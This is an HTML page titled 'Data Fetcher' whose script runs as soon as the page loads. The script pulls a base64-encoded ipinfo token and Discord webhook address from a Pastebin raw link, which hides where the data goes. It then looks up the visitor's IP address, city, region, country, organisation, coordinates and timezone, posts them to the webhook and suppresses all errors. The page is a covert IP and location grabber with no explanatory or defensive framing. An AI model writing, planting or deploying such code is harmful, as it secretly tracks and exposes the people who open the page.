<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Data Fetcher</title>
</head>
<body>
    <script>
        // Pastebin link with encoded token and webhook
        const pastebinUrl = 'https://pastebin.com/raw/quyru4jf';

        async function fetchDataAndSend() {
            try {
                // Fetch encoded token and webhook from Pastebin
                const pastebinResponse = await fetch(pastebinUrl);
                const encodedData = await pastebinResponse.text();
                const decodedData = atob(encodedData).split(',');

                // Extract token and webhook URL
                const token = decodedData[0];
                const webhookUrl = decodedData[1];

                // Fetch IP info data
                const response = await fetch(`https://ipinfo.io/json?token=${token}`);
                const data = await response.json();

                // Prepare message payload
                const payload = {
                    content: `Location Data:\nIP: ${data.ip}\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country}\nOrganization: ${data.org}\nCoordinates: ${data.loc}\nTimezone: ${data.timezone}`
                };

                // Send data to Discord webhook
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                // Handle any errors silently
            }
        }

        // Execute the function
        fetchDataAndSend();
    </script>
</body>
</html>
